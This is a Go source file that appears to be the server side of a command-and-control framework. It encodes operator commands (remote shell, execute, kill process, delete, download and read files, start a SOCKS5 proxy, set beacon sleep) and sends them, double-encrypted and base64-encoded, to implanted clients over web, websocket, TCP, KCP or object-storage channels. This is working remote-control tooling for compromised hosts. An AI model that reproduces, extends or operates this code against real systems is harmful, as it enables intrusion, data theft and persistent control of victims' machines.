package sendcommand

import (
	command1 "BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/connection/kcp"
	"BackendTemplate/pkg/connection/oss"
	"BackendTemplate/pkg/connection/tcp"
	ws "BackendTemplate/pkg/connection/websocket"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/utils"
	"bufio"
	"encoding/binary"
	"fmt"
	"github.com/gorilla/websocket"
	"strconv"
	"strings"
	"time"
)

func SendCommand(uid string, command string) {
	var byteToSend []byte
	if strings.HasPrefix(command, "shell ") {
		cmd := strings.TrimPrefix(command, "shell ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.SHELL))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if strings.HasPrefix(command, "cd ") {
		cmd := strings.TrimPrefix(command, "cd ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.CD))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if strings.HasPrefix(command, "sleep ") {
		cmd := strings.TrimPrefix(command, "sleep ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.SLEEP))
		sleepTime, _ := strconv.Atoi(cmd)
		sleepTime = sleepTime * 1000
		sleepTimeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(sleepTimeBytes, uint32(sleepTime))
		byteToSend = append(cmdTypeBytes, sleepTimeBytes...)
	} else if strings.HasPrefix(command, "pause ") {
		cmd := strings.TrimPrefix(command, "pause ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.PAUSE))
		sleepTime, _ := strconv.Atoi(cmd)
		sleepTime = sleepTime * 1000
		sleepTimeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(sleepTimeBytes, uint32(sleepTime))
		byteToSend = append(cmdTypeBytes, sleepTimeBytes...)
	} else if command == "pwd" {
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.PWD))
		byteToSend = cmdTypeBytes
	} else if command == "exit" {
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.EXIT))
		byteToSend = cmdTypeBytes
	} else if strings.HasPrefix(command, "kill ") {
		cmd := strings.TrimPrefix(command, "kill ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.KILL))
		pid, _ := strconv.Atoi(cmd)
		pidBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(pidBytes, uint32(pid))
		byteToSend = append(cmdTypeBytes, pidBytes...)
	} else if strings.HasPrefix(command, "mkdir ") {
		cmd := strings.TrimPrefix(command, "mkdir ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.MKDIR))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if command == "drives" {
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.DRIVES))
		byteToSend = cmdTypeBytes
	} else if strings.HasPrefix(command, "rm ") {
		cmd := strings.TrimPrefix(command, "rm ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.RM))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if strings.HasPrefix(command, "cp ") {
		cmd := strings.TrimPrefix(command, "cp ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.CP))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if strings.HasPrefix(command, "mv ") {
		cmd := strings.TrimPrefix(command, "mv ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.MV))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if strings.HasPrefix(command, "execute ") {
		cmd := strings.TrimPrefix(command, "execute ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.EXECUTE))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if command == "ps" {
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.PS))
		byteToSend = cmdTypeBytes
	} else if strings.HasPrefix(command, "filebrowse ") {
		cmd := strings.TrimPrefix(command, "filebrowse ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.FileBrowse))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if strings.HasPrefix(command, "download ") {
		cmd := strings.TrimPrefix(command, "download ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.DOWNLOAD))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if strings.HasPrefix(command, "filecontent ") {
		cmd := strings.TrimPrefix(command, "filecontent ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.FileContent))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if strings.HasPrefix(command, "socks5 ") {
		cmd := strings.TrimPrefix(command, "socks5 ")
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.Socks5Start))
		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
	} else if strings.HasPrefix(command, "socks5Close") {
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.Socks5Close))
		byteToSend = cmdTypeBytes
	} else if strings.HasPrefix(command, "clear") {
		var shell database.Shell
		database.Engine.Where("uid = ?", uid).Get(&shell)
		shell.ShellContent = "$ clear"
		database.Engine.Where("uid = ?", uid).Update(&shell)
		return
	}
	switch connection.ClientListenerType[uid] {
	case "web":
		command1.CommandQueues.AddCommand(uid, byteToSend)
	case "websocket":
		cmdBytes, _ := encrypt.Encrypt(byteToSend)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		ws.ClientManager[uid].WriteMessage(websocket.BinaryMessage, cmdBase64)
	case "tcp":
		cmdBytes, _ := encrypt.Encrypt(byteToSend)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		cmdLen := len(cmdBase64)
		cmdLenBytes := utils.WriteInt(cmdLen)
		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
		writer := bufio.NewWriter(tcp.TCPClientManger[uid])
		writer.Write(msgToSend)
		writer.Flush()
	case "kcp":
		cmdBytes, _ := encrypt.Encrypt(byteToSend)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		cmdLen := len(cmdBase64)
		cmdLenBytes := utils.WriteInt(cmdLen)
		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
		kcp.KCPClientManger[uid].Write(msgToSend)
	//writer := bufio.NewWriter(kcp.KCPClientManger[uid])
	//writer.Write(msgToSend)
	//writer.Flush()
	case "oss":
		cmdBytes, _ := encrypt.Encrypt(byteToSend)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		oss.Send(oss.Service, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
	}

}
func SendFileUploadCommand(uid string, byteToSend []byte) {
	switch connection.ClientListenerType[uid] {
	case "web":
		command1.CommandQueues.AddCommand(uid, byteToSend)
	case "websocket":
		cmdBytes, _ := encrypt.Encrypt(byteToSend)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		ws.ClientManager[uid].WriteMessage(websocket.BinaryMessage, cmdBase64)
	case "tcp":
		cmdBytes, _ := encrypt.Encrypt(byteToSend)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		cmdLen := len(cmdBase64)
		cmdLenBytes := utils.WriteInt(cmdLen)
		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
		writer := bufio.NewWriter(tcp.TCPClientManger[uid])
		writer.Write(msgToSend)
		writer.Flush()
	case "kcp":
		cmdBytes, _ := encrypt.Encrypt(byteToSend)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		cmdLen := len(cmdBase64)
		cmdLenBytes := utils.WriteInt(cmdLen)
		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
		kcp.KCPClientManger[uid].Write(msgToSend)
	//writer := bufio.NewWriter(kcp.KCPClientManger[uid])
	//writer.Write(msgToSend)
	//writer.Flush()
	case "oss":
		cmdBytes, _ := encrypt.Encrypt(byteToSend)
		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		oss.Send(oss.Service, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
	}
}
